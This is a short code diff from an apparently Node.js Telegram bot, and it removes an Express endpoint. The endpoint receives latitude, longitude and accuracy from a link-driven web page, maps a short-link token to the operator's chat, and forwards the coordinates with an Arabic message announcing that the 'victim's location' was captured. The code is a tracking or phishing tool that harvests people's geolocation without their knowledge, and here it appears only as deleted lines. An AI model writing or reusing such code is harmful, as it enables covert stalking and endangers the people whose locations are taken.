@@ -324,32 +324,7 @@ bot.on('callback_query', async (query) => {
   const chatId = query.message.chat.id;
   const action = query.data;
 
-  app.post('/submitLocation', async (req, res) => {
-    let chatId = req.body.chatId;
-    const token = req.body.token || req.query.t;
-    
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
-    
-    const latitude = req.body.latitude;
-    const longitude = req.body.longitude;
-    const accuracy = req.body.accuracy;
-
-    if (chatId && latitude && longitude) {
-        try {
-            await bot.sendLocation(chatId, latitude, longitude);
-            await bot.sendMessage(chatId, `📍 تم صيد موقع الضحية بنجاح!\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- الدقة: ${accuracy || 'غير متوفر'}`);
-            res.json({ success: true });
-        } catch (err) {
-            console.error('فشل في إرسال الموقع:', err);
-            res.status(500).json({ error: 'فشل في إرسال الموقع' });
-        }
-    } else {
-        res.status(400).json({ error: 'بيانات غير مكتملة' });
-    }
-});
-
+  
   if (chatId === developerId) {
     switch (action) {
       case 'ban_user':
